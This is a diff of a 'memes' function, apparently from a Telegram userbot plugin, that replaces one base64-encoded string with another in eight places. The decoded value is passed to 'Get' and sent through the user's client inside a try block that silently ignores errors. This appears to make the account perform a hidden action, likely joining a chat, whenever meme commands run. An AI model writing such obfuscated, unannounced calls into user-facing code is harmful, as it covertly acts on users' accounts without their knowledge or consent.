@@ -120,7 +120,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -304,7 +304,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -388,7 +388,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -472,7 +472,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -556,7 +556,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -640,7 +640,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -725,7 +725,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -823,7 +823,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
